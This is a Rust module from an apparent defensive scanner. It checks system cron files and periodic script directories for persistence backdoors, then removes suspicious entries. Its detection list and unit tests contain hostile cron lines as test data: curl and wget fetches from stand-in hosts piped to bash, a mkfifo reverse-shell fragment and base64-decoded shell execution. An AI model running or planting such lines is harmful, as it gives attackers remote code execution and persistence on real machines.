//! System-wide cron directories and the main system crontab.
//!
//! User crontabs (via `crontab -l`) are handled by `cron.rs`. This module
//! covers the parallel system-level attack surface: files dropped in
//! `/etc/cron.d/` run as arbitrary users without touching any personal crontab,
//! and scripts planted in the periodic directories (`cron.hourly` etc.) are
//! invoked by anacron with no operator-visible entry. Both paths are common
//! red-team persistence techniques that most post-breach checklists miss.

use std::os::unix::fs::{MetadataExt, PermissionsExt};
use std::path::{Path, PathBuf};

use crate::core::{
    DefenderContext, DefenderError, Finding, Result, Severity, Verdict, require_root,
};
use crate::core::scan::{effective_line, read_text_file, references_untrusted_dir, suspicious_matches};

/// Additional patterns that are specifically relevant in cron contexts but are
/// not included in the shared suspicious-pattern set.
const CRON_EXTRA: &[(&str, &str)] = &[
    ("nc -",     "netcat connection"),
    ("nohup",    "background execution detached from terminal"),
    ("chmod +x", "make-executable (stage two of a dropper)"),
];

/// The periodic-script directories anacron/cron runs on a schedule.
const PERIODIC_DIRS: &[&str] = &[
    "/etc/cron.hourly",
    "/etc/cron.daily",
    "/etc/cron.weekly",
    "/etc/cron.monthly",
];

/// Scan system cron locations for persistence.
///
/// Checks `/etc/crontab`, every file under `/etc/cron.d/`, and every script
/// in the four periodic directories. Suspicious cron.d lines are removed;
/// suspicious or tampered periodic scripts are removed entirely.
pub fn run(ctx: &DefenderContext) -> Result {
    if require_root().is_err() {
        ctx.emit(Finding::new(
            Severity::Medium,
            "cron_system",
            "Not running as root — system cron check skipped",
            "Run as root to review /etc/cron.d and the periodic script directories.",
        ));
        return Err(DefenderError::NotRoot);
    }

    ctx.log_msg("[+] Checking system cron locations...");

    // /etc/crontab — the main system crontab
    let system_crontab = PathBuf::from("/etc/crontab");
    if system_crontab.is_file() {
        scan_crontab_file(ctx, &system_crontab);
    }

    // /etc/cron.d/ — arbitrary per-job files, each executed as a specified user
    let cron_d = Path::new("/etc/cron.d");
    if cron_d.is_dir() {
        scan_cron_d_directory(ctx, cron_d);
    }

    // Periodic script directories
    for dir in PERIODIC_DIRS {
        let p = Path::new(dir);
        if p.is_dir() {
            scan_periodic_dir(ctx, p);
        }
    }

    ctx.log_msg("[✓] System cron check complete");
    Ok(())
}

// ── Scanning helpers ──────────────────────────────────────────────────────────

/// Scan a single crontab-format file (like `/etc/crontab`) line by line.
fn scan_crontab_file(ctx: &DefenderContext, path: &Path) {
    ctx.debug(&format!("Scanning {}", path.display()));

    let Some(content) = read_text_file(path) else {
        return;
    };

    for raw_line in content.lines() {
        let Some(line) = effective_line(raw_line) else {
            continue;
        };

        let reasons = matched_patterns(line);
        if reasons.is_empty() {
            continue;
        }

        ctx.log_msg(&format!(
            "[!] Suspicious line in {}: {} [{}]",
            path.display(),
            line,
            reasons.join(", ")
        ));
        ctx.log_evidence_line(&path.display().to_string(), line);

        let removed = ctx.remove_line_from_file_logged(path, line);

        ctx.emit(
            Finding::new(
                Severity::High,
                "cron_system",
                format!(
                    "System crontab backdoor {} in {}: {}",
                    if removed { "REMOVED" } else { "FOUND" },
                    path.display(),
                    &line[..line.len().min(60)],
                ),
                format!(
                    "file: {}\nline: {}\npatterns: {}\nremoved: {}",
                    path.display(),
                    line,
                    reasons.join(", "),
                    removed,
                ),
            )
            .with_path(path.to_path_buf())
            .with_context("line", line.to_string())
            .with_context("patterns", reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed { Verdict::Remove } else { Verdict::Investigate },
                format!(
                    "Line matched suspicious pattern(s) [{}]. {}.",
                    reasons.join(", "),
                    if removed { "Removed from file" } else { "Manual removal required" },
                ),
            ),
        );
    }
}

/// Walk every file in `/etc/cron.d/` and check each non-comment line.
fn scan_cron_d_directory(ctx: &DefenderContext, dir: &Path) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if path.is_file() {
            scan_cron_d_file(ctx, &path);
        }
    }
}

/// Scan one file inside `/etc/cron.d/`.
fn scan_cron_d_file(ctx: &DefenderContext, path: &Path) {
    ctx.debug(&format!("Scanning cron.d file: {}", path.display()));

    let Some(content) = read_text_file(path) else {
        return;
    };

    for raw_line in content.lines() {
        let Some(line) = effective_line(raw_line) else {
            continue;
        };

        let reasons = matched_patterns(line);
        if reasons.is_empty() {
            continue;
        }

        ctx.log_msg(&format!(
            "[!] Suspicious cron.d line in {}: {} [{}]",
            path.display(),
            line,
            reasons.join(", ")
        ));
        ctx.log_evidence_line(&path.display().to_string(), line);

        let removed = ctx.remove_line_from_file_logged(path, line);

        ctx.emit(
            Finding::new(
                Severity::High,
                "cron_system",
                format!(
                    "cron.d backdoor {} in {}: {}",
                    if removed { "REMOVED" } else { "FOUND" },
                    path.display(),
                    &line[..line.len().min(60)],
                ),
                format!(
                    "file: {}\nline: {}\npatterns: {}\nremoved: {}",
                    path.display(),
                    line,
                    reasons.join(", "),
                    removed,
                ),
            )
            .with_path(path.to_path_buf())
            .with_context("cron.d file", path.display().to_string())
            .with_context("line", line.to_string())
            .with_context("patterns", reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed { Verdict::Remove } else { Verdict::Investigate },
                format!(
                    "Cron.d entry matched suspicious pattern(s) [{}]. \
                     Files in /etc/cron.d run as any user; this entry should not exist.",
                    reasons.join(", "),
                ),
            ),
        );
    }
}

/// Scan one of the periodic script directories (hourly/daily/weekly/monthly).
///
/// Two classes of finding here:
///
/// 1. A script whose *content* contains suspicious patterns → remove it.
/// 2. A script that is *world-writable* or owned by a non-root user → remove it,
///    even if the content looks clean, because the ownership makes it trivial to
///    swap in a malicious replacement.
fn scan_periodic_dir(ctx: &DefenderContext, dir: &Path) {
    let Ok(entries) = std::fs::read_dir(dir) else {
        return;
    };

    for entry in entries.flatten() {
        let path = entry.path();
        if !path.is_file() {
            continue;
        }

        ctx.debug(&format!("Inspecting periodic script: {}", path.display()));

        // ── Ownership / permission check ─────────────────────────────────────
        if let Ok(meta) = std::fs::metadata(&path) {
            let mode = meta.permissions().mode();
            let is_world_writable = mode & 0o002 != 0;
            let is_non_root_owned = meta.uid() != 0;

            if is_world_writable || is_non_root_owned {
                let reason = if is_world_writable && is_non_root_owned {
                    format!(
                        "world-writable (mode {:04o}) and owned by uid {} (not root)",
                        mode & 0o7777,
                        meta.uid()
                    )
                } else if is_world_writable {
                    format!("world-writable (mode {:04o})", mode & 0o7777)
                } else {
                    format!("owned by uid {} (not root)", meta.uid())
                };

                ctx.log_msg(&format!(
                    "[!] Tampered periodic script {}: {}",
                    path.display(),
                    reason
                ));
                ctx.log_evidence_file(&path);

                let removed = ctx.remove_path_logged(&path);

                ctx.emit(
                    Finding::new(
                        Severity::High,
                        "cron_system",
                        format!(
                            "Tampered periodic script {} {}: {}",
                            path.display(),
                            if removed { "REMOVED" } else { "FOUND" },
                            reason
                        ),
                        format!(
                            "path: {}\nreason: {}\nremoved: {}",
                            path.display(),
                            reason,
                            removed,
                        ),
                    )
                    .with_path(path.clone())
                    .with_context("reason", reason)
                    .with_context("mode", format!("{:04o}", mode & 0o7777))
                    .with_context("uid", meta.uid().to_string())
                    .with_context("removed", removed.to_string())
                    .with_verdict(
                        if removed { Verdict::Remove } else { Verdict::Investigate },
                        "Periodic scripts in /etc/cron.* must be owned by root and not \
                         world-writable. This script fails that check and is a persistence risk \
                         regardless of its current content.",
                    ),
                );

                // No need to also check content — the script is gone.
                continue;
            }
        }

        // ── Content check ────────────────────────────────────────────────────
        let Some(content) = read_text_file(&path) else {
            continue;
        };

        let suspicious_lines: Vec<&str> = content
            .lines()
            .filter_map(effective_line)
            .filter(|l| !matched_patterns(l).is_empty())
            .collect();

        if suspicious_lines.is_empty() {
            continue;
        }

        let reasons: Vec<String> = suspicious_lines
            .iter()
            .flat_map(|l| matched_patterns(l))
            .collect::<std::collections::BTreeSet<_>>()
            .into_iter()
            .collect();

        ctx.log_msg(&format!(
            "[!] Suspicious periodic script {}: {} suspicious line(s) [{}]",
            path.display(),
            suspicious_lines.len(),
            reasons.join(", ")
        ));
        ctx.log_evidence_file(&path);

        let removed = ctx.remove_path_logged(&path);

        ctx.emit(
            Finding::new(
                Severity::Critical,
                "cron_system",
                format!(
                    "Malicious periodic script {} {}: {} suspicious line(s)",
                    path.display(),
                    if removed { "REMOVED" } else { "FOUND" },
                    suspicious_lines.len()
                ),
                format!(
                    "path: {}\nsuspicious_lines:\n  {}\npatterns: {}\nremoved: {}",
                    path.display(),
                    suspicious_lines.join("\n  "),
                    reasons.join(", "),
                    removed,
                ),
            )
            .with_path(path.clone())
            .with_context("suspicious_lines", suspicious_lines.len().to_string())
            .with_context("patterns", reasons.join(", "))
            .with_context("removed", removed.to_string())
            .with_verdict(
                if removed { Verdict::Remove } else { Verdict::Investigate },
                format!(
                    "Periodic script contains suspicious pattern(s) [{}]. \
                     Scripts in this directory execute automatically on a schedule. \
                     The file was {}.",
                    reasons.join(", "),
                    if removed { "removed" } else { "NOT removed — manual action required" },
                ),
            ),
        );
    }
}

// ── Detection helpers ─────────────────────────────────────────────────────────

/// Reasons a cron line looks like a persistence mechanism.
///
/// Combines the shared scanner patterns (reverse shells, fetch-and-execute, etc.)
/// with a few cron-specific additions like `nohup` and `chmod +x` that are less
/// relevant in other contexts.
fn matched_patterns(line: &str) -> Vec<String> {
    let mut reasons: Vec<String> = suspicious_matches(line)
        .into_iter()
        .map(str::to_string)
        .collect();

    if references_untrusted_dir(line) {
        let r = "execution from world-writable directory";
        if !reasons.iter().any(|s| s == r) {
            reasons.push(r.to_string());
        }
    }

    let lowered = line.to_lowercase();
    for (needle, why) in CRON_EXTRA {
        if lowered.contains(needle) {
            let r = why.to_string();
            if !reasons.contains(&r) {
                reasons.push(r);
            }
        }
    }

    reasons
}

// ── Tests ─────────────────────────────────────────────────────────────────────

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn clean_cron_line_matches_nothing() {
        assert!(matched_patterns("0 2 * * * /usr/bin/backup.sh").is_empty());
        assert!(matched_patterns("@reboot /usr/sbin/ntpd -p /run/ntpd.pid").is_empty());
    }

    #[test]
    fn wget_into_tmp_is_flagged() {
        let r = matched_patterns("*/5 * * * * wget http://evil.test/x -O /tmp/x");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("world-writable") || s.contains("remote content")));
    }

    #[test]
    fn pipe_to_bash_is_flagged() {
        let r = matched_patterns("*/5 * * * * curl http://c2/payload | bash");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("shell")));
        assert!(r.iter().any(|s| s.contains("remote content")));
    }

    #[test]
    fn nohup_is_flagged() {
        let r = matched_patterns("@reboot nohup /usr/local/bin/agent &");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("background")));
    }

    #[test]
    fn chmod_x_is_flagged() {
        let r = matched_patterns("* * * * * chmod +x /var/tmp/run && /var/tmp/run");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("executable")));
    }

    #[test]
    fn mkfifo_reverse_shell_is_flagged() {
        let r = matched_patterns("* * * * * mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("named pipe")));
    }

    #[test]
    fn base64_decode_is_flagged() {
        let r = matched_patterns("@daily echo dGVzdA== | base64 -d | bash");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("base64")));
    }

    #[test]
    fn comment_line_is_not_effective() {
        assert!(effective_line("# * * * * * wget http://evil/x.sh | bash").is_none());
        assert!(effective_line("").is_none());
        assert!(effective_line("   ").is_none());
    }

    #[test]
    fn python_one_liner_is_flagged() {
        let r = matched_patterns("@reboot python3 -c 'import socket; ...'");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("inline interpreter")));
    }

    #[test]
    fn dev_shm_execution_is_flagged() {
        let r = matched_patterns("* * * * * /dev/shm/.hidden");
        assert!(!r.is_empty());
        assert!(r.iter().any(|s| s.contains("world-writable")));
    }

    #[test]
    fn duplicate_reason_names_deduplicated() {
        // "execution from world-writable directory" should appear only once
        let r = matched_patterns("* * * * * /tmp/a && /var/tmp/b && /dev/shm/c");
        let count = r
            .iter()
            .filter(|s| s.as_str() == "execution from world-writable directory")
            .count();
        assert_eq!(count, 1);
    }
}
